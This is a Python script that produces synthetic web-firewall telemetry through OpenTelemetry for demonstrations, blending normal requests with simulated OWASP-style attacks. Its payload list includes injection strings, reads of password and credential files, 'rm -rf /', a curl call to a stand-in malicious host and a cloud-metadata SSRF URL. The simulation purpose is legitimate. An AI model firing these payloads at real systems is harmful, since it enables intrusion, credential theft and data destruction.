"""
WAF Telemetry Generator
Generates realistic WAF events with OpenTelemetry traces, logs, and metrics
"""

import os
import random
import time
from datetime import datetime
from typing import Dict, Any, Tuple
from faker import Faker

from opentelemetry import trace, metrics
from opentelemetry.sdk.trace import TracerProvider
from opentelemetry.sdk.trace.export import BatchSpanProcessor
from opentelemetry.sdk.metrics import MeterProvider
from opentelemetry.sdk.metrics.export import PeriodicExportingMetricReader
from opentelemetry.exporter.otlp.proto.http.trace_exporter import OTLPSpanExporter
from opentelemetry.exporter.otlp.proto.http.metric_exporter import OTLPMetricExporter
from opentelemetry.sdk.resources import Resource
from opentelemetry.semconv.resource import ResourceAttributes
from opentelemetry.trace import Status, StatusCode

fake = Faker()


class WAFTelemetryGenerator:
    """Generates WAF telemetry data following OpenTelemetry standards"""

    # OWASP Top 10 Attack Patterns
    ATTACK_PATTERNS = {
        "sql_injection": {
            "name": "SQL Injection",
            "owasp_id": "A03:2021",
            "severity": "high",
            "payloads": [
                "' OR '1'='1",
                "admin'--",
                "1' UNION SELECT NULL--",
                "'; DROP TABLE users--",
                "1' AND 1=1--"
            ],
            "rules": ["SQLi-001", "SQLi-002", "SQLi-003"]
        },
        "xss": {
            "name": "Cross-Site Scripting (XSS)",
            "owasp_id": "A03:2021",
            "severity": "high",
            "payloads": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert(1)>",
                "javascript:alert(document.cookie)",
                "<svg/onload=alert('XSS')>",
                "<iframe src='javascript:alert(1)'>"
            ],
            "rules": ["XSS-001", "XSS-002", "XSS-003"]
        },
        "path_traversal": {
            "name": "Path Traversal",
            "owasp_id": "A01:2021",
            "severity": "high",
            "payloads": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "....//....//....//etc/passwd",
                "/../../etc/shadow"
            ],
            "rules": ["PATH-001", "PATH-002"]
        },
        "command_injection": {
            "name": "Command Injection",
            "owasp_id": "A03:2021",
            "severity": "critical",
            "payloads": [
                "; ls -la",
                "| cat /etc/passwd",
                "`whoami`",
                "$(curl malicious.com)",
                "&& rm -rf /"
            ],
            "rules": ["CMD-001", "CMD-002"]
        },
        "xxe": {
            "name": "XML External Entity (XXE)",
            "owasp_id": "A05:2021",
            "severity": "high",
            "payloads": [
                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
                "<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>",
            ],
            "rules": ["XXE-001", "XXE-002"]
        },
        "csrf": {
            "name": "Cross-Site Request Forgery (CSRF)",
            "owasp_id": "A01:2021",
            "severity": "medium",
            "payloads": ["<form action='https://bank.com/transfer'>"],
            "rules": ["CSRF-001"]
        },
        "lfi": {
            "name": "Local File Inclusion",
            "owasp_id": "A03:2021",
            "severity": "high",
            "payloads": [
                "php://filter/convert.base64-encode/resource=index",
                "file:///etc/passwd",
                "expect://whoami"
            ],
            "rules": ["LFI-001", "LFI-002"]
        },
        "rce": {
            "name": "Remote Code Execution",
            "owasp_id": "A03:2021",
            "severity": "critical",
            "payloads": [
                "eval(base64_decode('malicious'))",
                "system('rm -rf /')",
                "exec('cat /etc/passwd')"
            ],
            "rules": ["RCE-001", "RCE-002"]
        },
        "ldap_injection": {
            "name": "LDAP Injection",
            "owasp_id": "A03:2021",
            "severity": "medium",
            "payloads": ["*)(uid=*))(|(uid=*", "admin)(&(password=*)"],
            "rules": ["LDAP-001"]
        },
        "ssrf": {
            "name": "Server-Side Request Forgery",
            "owasp_id": "A10:2021",
            "severity": "high",
            "payloads": [
                "http://169.254.169.254/latest/meta-data/",
                "http://localhost:8080/admin",
                "file:///etc/passwd"
            ],
            "rules": ["SSRF-001", "SSRF-002"]
        }
    }

    # Cloud Provider Regions
    CLOUD_REGIONS = {
        "aws": [
            "us-east-1", "us-west-2", "eu-west-1", "ap-southeast-1",
            "ap-northeast-1", "us-east-2", "eu-central-1"
        ],
        "azure": [
            "eastus", "westus2", "westeurope", "southeastasia",
            "japaneast", "centralus", "northeurope"
        ],
        "gcp": [
            "us-central1", "us-east1", "europe-west1", "asia-southeast1",
            "asia-northeast1", "us-west1", "europe-west2"
        ]
    }

    # HTTP Methods and Paths
    HTTP_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH"]
    NORMAL_PATHS = [
        "/api/users", "/api/products", "/api/orders", "/api/search",
        "/api/auth/login", "/api/auth/logout", "/api/profile",
        "/api/dashboard", "/api/settings", "/health"
    ]

    def __init__(self):
        """Initialize the WAF telemetry generator"""
        # Configuration
        self.events_per_second = int(os.getenv('EVENTS_PER_SECOND', 100))
        self.normal_ratio = float(os.getenv('NORMAL_TRAFFIC_RATIO', 0.80))

        # Cloud provider ratios (normalize to 1.0)
        aws_ratio = int(os.getenv('AWS_RATIO', 6))
        azure_ratio = int(os.getenv('AZURE_RATIO', 1))
        gcp_ratio = int(os.getenv('GCP_RATIO', 3))
        total = aws_ratio + azure_ratio + gcp_ratio

        self.cloud_weights = {
            "aws": aws_ratio / total,
            "azure": azure_ratio / total,
            "gcp": gcp_ratio / total
        }

        # DDoS simulation - periodic spikes
        self.ddos_cycle_duration = 300  # 5 minutes
        self.ddos_spike_probability = 0.0  # Will be calculated dynamically

        # Initialize OpenTelemetry
        self._init_otel()

        print(f"✅ WAF Generator initialized:")
        print(f"   - Events/sec: {self.events_per_second}")
        print(f"   - Normal traffic: {self.normal_ratio * 100}%")
        print(f"   - Cloud weights: AWS={self.cloud_weights['aws']:.2f}, "
              f"Azure={self.cloud_weights['azure']:.2f}, GCP={self.cloud_weights['gcp']:.2f}")

    def _init_otel(self):
        """Initialize OpenTelemetry with proper configuration"""
        # Service name
        service_name = os.getenv('OTEL_SERVICE_NAME', 'waf-telemetry-generator')

        # Resource
        resource = Resource(attributes={
            ResourceAttributes.SERVICE_NAME: service_name,
            ResourceAttributes.SERVICE_VERSION: "1.0.0",
            ResourceAttributes.DEPLOYMENT_ENVIRONMENT: "workshop"
        })

        # Trace Provider
        trace_provider = TracerProvider(resource=resource)
        otlp_endpoint = os.getenv('OTEL_EXPORTER_OTLP_ENDPOINT', 'http://localhost:4318')
        span_exporter = OTLPSpanExporter(endpoint=f"{otlp_endpoint}/v1/traces")
        trace_provider.add_span_processor(BatchSpanProcessor(span_exporter))
        trace.set_tracer_provider(trace_provider)

        # Meter Provider
        metric_reader = PeriodicExportingMetricReader(
            OTLPMetricExporter(endpoint=f"{otlp_endpoint}/v1/metrics")
        )
        meter_provider = MeterProvider(resource=resource, metric_readers=[metric_reader])
        metrics.set_meter_provider(meter_provider)

        # Get tracer and meter
        self.tracer = trace.get_tracer(__name__)
        self.meter = metrics.get_meter(__name__)

        # Create metrics
        self.request_counter = self.meter.create_counter(
            name="waf.requests.total",
            description="Total number of WAF requests",
            unit="1"
        )
        self.blocked_counter = self.meter.create_counter(
            name="waf.requests.blocked",
            description="Total number of blocked requests",
            unit="1"
        )
        self.response_time_histogram = self.meter.create_histogram(
            name="waf.response.time",
            description="WAF response time in milliseconds",
            unit="ms"
        )

    def _calculate_ddos_probability(self) -> float:
        """Calculate DDoS spike probability based on time cycle"""
        # Create periodic spikes: high probability for 30s every 5 minutes
        cycle_position = time.time() % self.ddos_cycle_duration
        spike_start = 60  # Start spike at 1 minute into cycle
        spike_end = 90    # End spike at 1.5 minutes into cycle

        if spike_start <= cycle_position <= spike_end:
            return 0.3  # 30% chance of DDoS during spike window
        return 0.0

    def _select_cloud_provider(self) -> Tuple[str, str]:
        """Select cloud provider based on configured ratios"""
        provider = random.choices(
            list(self.cloud_weights.keys()),
            weights=list(self.cloud_weights.values()),
            k=1
        )[0]
        region = random.choice(self.CLOUD_REGIONS[provider])
        return provider, region

    def _generate_normal_request(self) -> Dict[str, Any]:
        """Generate a normal HTTP request"""
        return {
            "method": random.choice(self.HTTP_METHODS),
            "path": random.choice(self.NORMAL_PATHS),
            "query": fake.uri_path() if random.random() > 0.7 else "",
            "user_agent": fake.user_agent(),
            "source_ip": fake.ipv4(),
            "is_attack": False
        }

    def _generate_attack_request(self) -> Dict[str, Any]:
        """Generate an attack request based on OWASP patterns"""
        attack_type = random.choice(list(self.ATTACK_PATTERNS.keys()))
        attack_info = self.ATTACK_PATTERNS[attack_type]

        payload = random.choice(attack_info["payloads"])
        method = "POST" if attack_type in ["sql_injection", "command_injection"] else random.choice(self.HTTP_METHODS)

        # Inject payload into path or query
        if random.random() > 0.5:
            path = f"/api/search?q={payload}"
        else:
            path = f"/api/{payload}"

        return {
            "method": method,
            "path": path,
            "query": f"malicious={payload}",
            "user_agent": fake.user_agent(),
            "source_ip": fake.ipv4(),
            "is_attack": True,
            "attack_type": attack_type,
            "attack_info": attack_info,
            "payload": payload
        }

    def _generate_ddos_request(self) -> Dict[str, Any]:
        """Generate a DDoS request (high volume from same IPs)"""
        # Reuse IP addresses to simulate DDoS
        attacker_ips = [
            "203.0.113.1", "203.0.113.2", "203.0.113.3",
            "198.51.100.1", "198.51.100.2"
        ]

        return {
            "method": "GET",
            "path": random.choice(self.NORMAL_PATHS),
            "query": "",
            "user_agent": "Mozilla/5.0 (Bot)",
            "source_ip": random.choice(attacker_ips),
            "is_attack": True,
            "attack_type": "ddos",
            "attack_info": {
                "name": "DDoS Attack",
                "owasp_id": "N/A",
                "severity": "critical",
                "rules": ["RATE-001"]
            },
            "payload": "high_volume_traffic"
        }

    def _determine_waf_action(self, request: Dict[str, Any]) -> Tuple[str, float, float]:
        """
        Determine WAF action and calculate threat score and response time

        Returns:
            (action, threat_score, response_time_ms)
        """
        if request["is_attack"]:
            # Attack detected
            attack_type = request.get("attack_type", "unknown")

            if attack_type == "ddos":
                # DDoS: sometimes gets through initially
                action = "block" if random.random() > 0.1 else "allow"
                threat_score = random.uniform(80, 95)
                response_time = random.uniform(5, 15)  # Fast decision
            else:
                # Other attacks: high block rate
                action = "block" if random.random() > 0.05 else "allow"
                severity = request["attack_info"]["severity"]

                if severity == "critical":
                    threat_score = random.uniform(90, 100)
                elif severity == "high":
                    threat_score = random.uniform(75, 90)
                else:
                    threat_score = random.uniform(60, 75)

                response_time = random.uniform(10, 50)  # Slower for complex checks
        else:
            # Normal traffic
            action = "allow"
            threat_score = random.uniform(0, 20)
            response_time = random.uniform(1, 5)  # Fast for normal traffic

        return action, threat_score, response_time

    def generate_event(self) -> Dict[str, Any]:
        """Generate a single WAF event with full OpenTelemetry instrumentation"""

        # Check for DDoS spike
        self.ddos_spike_probability = self._calculate_ddos_probability()

        # Determine if this is a DDoS attack
        if random.random() < self.ddos_spike_probability:
            request = self._generate_ddos_request()
        # Determine if attack or normal
        elif random.random() > self.normal_ratio:
            request = self._generate_attack_request()
        else:
            request = self._generate_normal_request()

        # Select cloud provider
        cloud_provider, region = self._select_cloud_provider()

        # Determine WAF action
        action, threat_score, response_time_ms = self._determine_waf_action(request)

        # Generate trace with span structure: Request → WAF Inspection → Decision
        with self.tracer.start_as_current_span(
            "waf.request",
            kind=trace.SpanKind.SERVER
        ) as root_span:
            # Root span attributes
            root_span.set_attribute("http.method", request["method"])
            root_span.set_attribute("http.url", request["path"])
            root_span.set_attribute("http.user_agent", request["user_agent"])
            root_span.set_attribute("client.ip", request["source_ip"])
            root_span.set_attribute("cloud.provider", cloud_provider.upper())
            root_span.set_attribute("cloud.region", region)
            root_span.set_attribute("waf.is_attack", request["is_attack"])

            # Child span: WAF Inspection
            with self.tracer.start_as_current_span(
                "waf.inspection",
                kind=trace.SpanKind.INTERNAL
            ) as inspection_span:
                inspection_span.set_attribute("waf.threat_score", threat_score)

                if request["is_attack"]:
                    attack_info = request["attack_info"]
                    inspection_span.set_attribute("waf.attack_type", request["attack_type"])
                    inspection_span.set_attribute("waf.attack_name", attack_info["name"])
                    inspection_span.set_attribute("waf.owasp_id", attack_info["owasp_id"])
                    inspection_span.set_attribute("waf.severity", attack_info["severity"])
                    inspection_span.set_attribute("waf.payload", request["payload"][:100])  # Truncate
                    matched_rule = random.choice(attack_info["rules"])
                    inspection_span.set_attribute("waf.matched_rule", matched_rule)

                    # Add event for rule match
                    inspection_span.add_event(
                        "waf.rule_matched",
                        attributes={
                            "rule.id": matched_rule,
                            "rule.message": f"Detected {attack_info['name']}",
                            "threat.score": threat_score
                        }
                    )

            # Child span: WAF Decision
            with self.tracer.start_as_current_span(
                "waf.decision",
                kind=trace.SpanKind.INTERNAL
            ) as decision_span:
                decision_span.set_attribute("waf.action", action)
                decision_span.set_attribute("waf.response_time_ms", response_time_ms)

                # Set span status based on action
                if action == "block":
                    decision_span.set_status(Status(StatusCode.ERROR, "Request blocked by WAF"))
                    root_span.set_status(Status(StatusCode.ERROR, "Request blocked"))
                else:
                    decision_span.set_status(Status(StatusCode.OK))
                    root_span.set_status(Status(StatusCode.OK))

                # Add event for decision
                decision_span.add_event(
                    "waf.decision_made",
                    attributes={
                        "action": action,
                        "reason": "threat_detected" if request["is_attack"] else "clean_traffic"
                    }
                )

        # Record metrics
        self.request_counter.add(1, {
            "cloud.provider": cloud_provider,
            "waf.action": action,
            "http.method": request["method"]
        })

        if action == "block":
            self.blocked_counter.add(1, {
                "cloud.provider": cloud_provider,
                "attack.type": request.get("attack_type", "none")
            })

        self.response_time_histogram.record(response_time_ms, {
            "cloud.provider": cloud_provider,
            "waf.action": action
        })

        # Return event statistics for UI
        return {
            "is_attack": request["is_attack"],
            "action": action,
            "cloud_provider": cloud_provider.upper(),
            "threat_score": threat_score,
            "response_time_ms": response_time_ms
        }
